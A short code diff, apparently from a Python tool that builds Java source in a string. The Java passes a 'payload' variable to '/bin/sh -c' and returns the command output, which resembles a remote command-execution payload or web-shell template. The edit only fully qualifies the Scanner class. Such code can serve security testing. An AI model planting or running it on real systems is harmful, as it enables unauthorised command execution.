@@ -17,7 +17,8 @@ code = """
                 new String[] {"/bin/sh", "-c", payload}
             );
         }
-        Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\\\A");
+        java.util.Scanner s = new java.util.Scanner(process.getInputStream())
+            .useDelimiter("\\\\A");
         String result = s.hasNext()?s.next():"";
         return result;
     }
